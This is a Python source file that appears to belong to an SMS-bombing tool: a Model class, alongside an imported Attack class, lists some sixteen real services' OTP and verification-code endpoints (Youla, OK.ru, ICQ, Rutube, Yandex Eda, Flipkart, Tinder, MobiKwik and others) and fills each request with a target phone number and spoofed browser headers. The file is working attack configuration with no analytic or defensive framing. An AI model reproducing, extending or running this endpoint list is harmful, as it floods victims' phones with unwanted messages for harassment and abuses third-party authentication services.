from attack import Attack
from serviceModel import ServiceModel
from person import Person

# You can add more services. Maybe can me moved to a separate file.
# User agent can be added.

class Model:

    def __init__(self):
        self.services = []
        self.attack_service = Attack()

    def fillServices(self, phone: str):
        person = Person()
        youla = ServiceModel(
            url='https://youla.ru/web-api/auth/request_code',
            data={'phone': phone},
            headers={
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Host': 'youla.ru',
                'Origin': 'https://youla.ru',
                'Referer': 'https://youla.ru/'}
        )
        odnoklassniki = ServiceModel(
            url='https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
            data={'st.r.phone': "+"+phone},
            headers={
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Origin': 'https://ok.ru',
                'Referer': 'https://ok.ru/'
            }
        )
        icq = ServiceModel(
            url='https://icq.com/smscode/login/ru',
            data={'msisdn': phone},
            headers={
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Origin': 'https://icq.com',
                'Host': 'icq.com',
                'Referer': 'https://icq.com/login/ru'
            }
        )
        worki = ServiceModel(
            url='https://api.iconjob.co/api/auth/verification_code',
            data={'phone': phone},
            headers={
                'Accept-Language': 'ru-RU',
                'Origin': 'https://worki.ru',
                'Referer': 'https://worki.ru/'
            }
        )
        rutube = ServiceModel(
            url='https://pass.rutube.ru/api/accounts/phone/send-password/',
            data={'phone': '+'+phone},
            headers={
            }
        )
        yandexEda = ServiceModel(
            url='https://eda.yandex.ru/api/v1/user/request_authentication_code',
            data={'phone_number': '+'+phone},
            headers={
            }
        )
        koronaPay = ServiceModel(
            url='https://koronapay.com/transfers/online/api/users/otps',
            data={'phone': phone},
            headers={
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Origin': 'https://koronapay.com',
                'Referer': 'https://koronapay.com/transfers/online/receive/'
            }
        )
        flipKart = ServiceModel(
            url='https://2.rome.api.flipkart.com/api/5/user/otp/generate',
            data={'loginId': phone},
            headers={
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Origin': 'https://www.flipkart.com',
                'Referer': 'https://www.flipkart.com/'
            }
        )
        zdravCity = ServiceModel(
            url='https://zdravcity.ru/ajax/ajax_login_check.php',
            data={'LOGIN': phone, 'is_phone': '1'},
            headers={
                'Accept-Language': 'en-us',
                'Connection': 'keep-alive',
                'Referer': 'https://zdravcity.ru/'
            }
        )
        pharmeasy = ServiceModel(
            url='https://pharmeasy.in/api/auth/requestOTP',
            data={'contactNumber': phone},
            headers={
                'Host': 'pharmeasy.in',
                'Origin': 'https://pharmeasy.in',
                'Accept-Language': 'en-us',
                'Connection': 'keep-alive',
                'Referer': 'https://pharmeasy.in/'
            }
        )
        mylescars = ServiceModel(
            url='https://www.mylescars.com/usermanagements/chkContact',
            data={'contactNo': phone},
            headers={
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://www.mylescars.com',
                'Referer': 'https://www.mylescars.com/'
            }
        )
        mobikwik = ServiceModel(
            url='https://webapi.mobikwik.com/p/account/otp/cell/v2',
            data={'cell': phone},
            headers={
                "X-MClient": "0"
            }
        )
        deliveryClub = ServiceModel(
            url='https://api.delivery-club.ru/api1.2/user/otp',
            data={'phone': phone, 'newotp': '1'},
            headers={
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://www.delivery-club.ru',
                'Referer': 'hhttps://www.delivery-club.ru/'
            }
        )
        tinder = ServiceModel( 
            url='https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
            data={'phone_number': phone},
            headers={
            }
        )
        unacademy = ServiceModel( 
            url='https://unacademy.com/api/v1/user/get_app_link/',
            data={'phone': phone},
            headers={
            }
        )
        treebo = ServiceModel(
            url='https://www.treebo.com/api/v2/auth/login/otp/',
            data={'phone_number': phone},
            headers={
            }
        )
        self.services.append(treebo)
        self.services.append(unacademy)
        self.services.append(tinder)
        self.services.append(deliveryClub)
        self.services.append(mobikwik)
        self.services.append(mylescars)
        self.services.append(pharmeasy)
        self.services.append(zdravCity)
        self.services.append(worki)
        self.services.append(yandexEda)
        self.services.append(flipKart)
        self.services.append(koronaPay)
        self.services.append(rutube)
        self.services.append(odnoklassniki)
        self.services.append(youla)
        self.services.append(icq)
        